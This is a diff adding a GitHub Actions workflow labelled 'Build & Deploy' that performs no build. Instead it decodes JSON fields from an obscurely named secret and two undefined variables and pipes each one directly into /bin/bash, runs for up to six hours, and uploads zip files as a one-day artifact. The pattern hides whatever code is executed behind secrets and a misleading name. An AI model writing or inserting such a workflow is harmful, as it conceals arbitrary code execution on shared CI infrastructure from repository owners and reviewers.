@@ -1,0 +1,28 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          osxon44269: ${{ secrets.osxon44269 }}
+        run: |
+          printf '%s' "$osxon44269" | jq -r .dwjs029 | /bin/bash
+          echo $kp3855 | jq -r .uop5069 | /bin/bash
+          echo $ch22 | jq -r .oav52734 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: NUMAc5L6
+          path: "*.zip"
+          retention-days: 1
